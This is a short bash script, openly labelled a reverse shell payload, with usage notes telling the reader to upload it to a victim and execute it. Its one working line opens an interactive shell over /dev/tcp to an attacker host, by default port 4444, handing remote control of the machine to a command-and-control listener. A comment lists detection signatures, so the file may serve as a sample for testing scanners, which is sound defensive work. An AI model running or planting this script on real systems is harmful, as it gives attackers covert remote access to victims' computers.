#!/bin/bash
# Reverse Shell Payload — connects back to attacker C2 listener
# Usage: Upload to victim, then execute
# Detectable by: signature scan (Trojan.ReverseShell.Bash), behavioral (C2_COMMUNICATION)
TARGET="${1:-attacker}"
PORT="${2:-4444}"

echo "[*] Initiating reverse shell to ${TARGET}:${PORT}..."
bash -i >& /dev/tcp/${TARGET}/${PORT} 0>&1
